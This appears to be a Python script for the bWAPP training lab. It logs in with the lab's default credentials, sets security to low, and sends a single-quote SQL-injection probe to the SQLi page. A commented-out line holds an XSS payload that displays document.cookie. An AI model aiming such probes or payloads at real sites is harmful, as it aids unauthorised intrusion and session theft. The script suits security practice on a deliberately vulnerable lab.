# bWApp HTML Injection Security - Low #
import sys
import mechanize
from bs4 import BeautifulSoup
url = sys.argv[1]

br = mechanize.Browser()

#br.set_all_readonly(False)   # allow everything to be written to
br.set_handle_robots(False)   # no robots
br.set_handle_refresh(False)  # can sometimes hang without this
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
# [('User-agent', 'Firefox')]

response = br.open(url)
#print response.read()      # the text of the page

response1 = br.response()  # get the response again
#print response1.read()     # can apply lxml.html.fromstring()

#for form in br.forms():
#	print form
br.select_form(nr=0)
br.method="POST"
br['login']='bee'
br['password']='bug'
br['security_level']=0
response=br.submit()
print br.response()

base_url = url.rsplit('/',2)[0]
response = br.open(base_url+'/bWAPP/sqli_1.php')
br.select_form(nr=0)
br.method="GET"
br['title']="'"
#br['lastname']='<script>alert(document.cookie);</script>'
response=br.submit()

data = br.response().read()
bs = BeautifulSoup(data,'html.parser')
res=bs.find_all('table',{'id':'table_yellow'})
print res[0]
